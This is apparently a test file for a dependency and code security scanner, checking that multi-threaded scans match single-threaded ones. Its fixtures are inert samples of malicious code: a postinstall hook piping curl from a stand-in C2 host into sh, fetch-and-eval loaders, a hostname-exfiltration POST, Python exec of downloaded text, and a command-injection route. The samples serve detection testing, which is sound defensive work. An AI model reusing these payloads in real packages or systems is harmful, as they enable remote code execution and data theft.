// 0.1.8: the CLI's per-file work on worker threads (pool.js): each file's
// scan and --deps' checks of each dependency file (the import-time and agent
// checks, the cross-file follower) answered by workers, each with its own
// instance of the native engine, the findings taken back in the order asked:
// the report is the same with any number of threads. LAZARET_THREADS sets
// how many (1: none); a scan with less than MIN_CHARS to read besides its
// largest file uses none unless it says. Inert text: hosts are .invalid, nothing is executed.

import { test } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { run } from "../src/index.js";
import { Pool, threadsFor, mapTasks, MIN_CHARS, MAX_THREADS } from "../src/pool.js";

const U = "'https://c2.invalid/p'";
const NET = "function pull() {\n  return fetch(" + U + ").then((r) => r.text());\n}\nmodule.exports = { pull };\n";
const AWS = "AKIA" + "ABCDEFGHIJKLMNOP";           // a fake key, built so no scanner takes it for a real one

const FILES = {
  "package.json": JSON.stringify({ name: "app", version: "1.0.0", dependencies: { pkg: "1.0.0" } }),
  "app.js": "const express = require('express');\nconst app = express();\n"
    + "app.get('/r', (req, res) => { require('child_process').exec(req.query.cmd); });\n"
    + `const key = '${AWS}';\n// TODO: tidy\n`,
  "lib/util.py": "import os\n\ndef run(cmd):\n    os.system(cmd)\n\nrun(input())\n",
  "db.sql": "DELETE FROM users;\n",
  "node_modules/pkg/package.json": JSON.stringify({ name: "pkg", version: "1.0.0", main: "run.js",
    scripts: { postinstall: "node setup.js" } }),
  "node_modules/pkg/setup.js": "require('child_process').execSync('curl https://c2.invalid/x | sh');\n",
  "node_modules/pkg/net.js": NET,
  "node_modules/pkg/run.js": "const { pull } = require('./net');\npull().then((c) => eval(c));\n",
  "node_modules/pkg/key.js": `module.exports = '${AWS}';\n`,
  "node_modules/solo/package.json": JSON.stringify({ name: "solo", version: "1.0.0" }),
  "node_modules/solo/net.js": NET,
  // flagged single-file (CRITICAL): the follower, which finds it too, leaves it alone
  "node_modules/solo/run.js": "const { pull } = require('./net');\nfetch(" + U + ").then((r) => r.text()).then((c) => eval(c));\n",
  "node_modules/side/package.json": JSON.stringify({ name: "side", version: "1.0.0" }),
  "node_modules/side/index.js": "const os = require('os');\nfetch(" + U + ", { method: 'POST', body: os.hostname() });\n",
  "node_modules/side/py/mod.py": "import requests\nexec(requests.get(" + U + ").text)\n",
};

function tree(files) {
  const root = mkdtempSync(join(tmpdir(), "lz-pool-"));
  for (const [rel, data] of Object.entries(files)) {
    mkdirSync(dirname(join(root, rel)), { recursive: true });
    writeFileSync(join(root, rel), data);
  }
  return root;
}

function report(root, threads, args = []) {
  const out = mkdtempSync(join(tmpdir(), "lz-pool-out-"));
  try {
    const code = run(["check", root, ...args, "--out-dir", out, "--no-html", "--quiet"],
      { out: () => {}, err: () => {}, env: { LAZARET_THREADS: String(threads) } });
    const rep = JSON.parse(readFileSync(join(out, "lazaret-report.json"), "utf8"));
    return { code, issues: rep.issues.map((i) => [i.rule, i.file.replaceAll("\\", "/"), i.line, i.sev, i.msg, i.snippet]) };
  } finally {
    rmSync(out, { recursive: true, force: true });
  }
}

test("how many threads: LAZARET_THREADS, else one per core for a scan with enough to read", () => {
  assert.equal(threadsFor({ LAZARET_THREADS: "1" }, 1e9), 1);
  assert.equal(threadsFor({ LAZARET_THREADS: "0" }, 1e9), 1);
  assert.equal(threadsFor({ LAZARET_THREADS: "many" }, 1e9), 1);
  assert.equal(threadsFor({ LAZARET_THREADS: "3" }, 0), 3);
  assert.equal(threadsFor({}, MIN_CHARS - 1), 1);
  assert.equal(threadsFor({}, 40 * MIN_CHARS, 39 * MIN_CHARS + 1), 1);     // (one file is most of it)
  assert.equal(threadsFor({ LAZARET_THREADS: "2" }, 40 * MIN_CHARS, 39 * MIN_CHARS + 1), 2);
  for (const auto of [threadsFor({}, MIN_CHARS), threadsFor({}, 40 * MIN_CHARS, 39 * MIN_CHARS)]) {
    assert.ok(auto >= 1 && auto <= MAX_THREADS);
  }
});

test("a project and its dependencies scan alike on workers and without", () => {
  const root = tree(FILES);
  try {
    for (const args of [[], ["--deps"]]) {
      const one = report(root, 1, args);
      for (const threads of [2, 3]) {
        assert.deepEqual(report(root, threads, args), one, `${threads} threads, ${args.join(" ")}`);
      }
      if (args.length) {
        const rules = one.issues.map(([rule, file, , sev, msg]) => [rule, file, sev, msg.split(";")[0]]);
        // the cross-file finding (on a worker), the single-file one it leaves to the import-time check
        assert.ok(rules.some(([r, f, s, m]) => r === "SC-IMPORT-RISK" && f === "node_modules/pkg/run.js" && s === "CRITICAL"
          && m === "Dependency code runs code it receives over the network"), JSON.stringify(rules));
        assert.equal(one.issues.filter(([r, f]) => r === "SC-IMPORT-RISK" && f === "node_modules/solo/run.js").length, 1);
        assert.ok(rules.some(([r, f]) => r === "SC-IMPORT-RISK" && f === "node_modules/side/py/mod.py"));
      }
    }
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("a task no worker answers is answered here, and an error is an error either way", () => {
  assert.deepEqual(mapTasks(null, [["n", 1], ["n", 2]], ([, x]) => x * 10, () => "error"), [10, 20]);
  assert.deepEqual(mapTasks(null, [["n", 1]], () => { throw new RangeError("x"); }, (_t, e) => e.name), ["RangeError"]);
  const pool = new Pool(2);
  try {
    const file = { name: "a.js", path: "a.js", content: "eval(atob('ZXZhbA=='));\n", lang: "js", dep: true };
    const got = mapTasks(pool, [["scan", file], ["no such task", 1]], () => "here", (_t, e) => `error ${e.name}`);
    assert.ok(Array.isArray(got[0]) && got[0].length > 0, JSON.stringify(got[0]));
    assert.equal(got[1], "error TypeError");
    pool.close();
    assert.deepEqual(mapTasks(pool, [["scan", file]], () => "here", () => "error"), ["here"]);    // (closed: answered here)
  } finally {
    pool.close();
  }
});

test("workers that could not start send their tasks back at once, to be run here", () => {
  const empty = new WebAssembly.Module(new Uint8Array([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]));   // (no engine in it)
  const pool = new Pool(2, empty);
  try {
    const started = Date.now();
    const tasks = [1, 2, 3, 4, 5].map((n) => ["scan", n]);
    assert.deepEqual(mapTasks(pool, tasks, ([, n]) => n * 10, () => "error"), [10, 20, 30, 40, 50]);
    assert.ok(Date.now() - started < 10_000);              // (not the wait for workers that never answer)
    assert.deepEqual(mapTasks(pool, tasks.slice(0, 2), ([, n]) => -n, () => "error"), [-1, -2]);
  } finally {
    pool.close();
  }
});
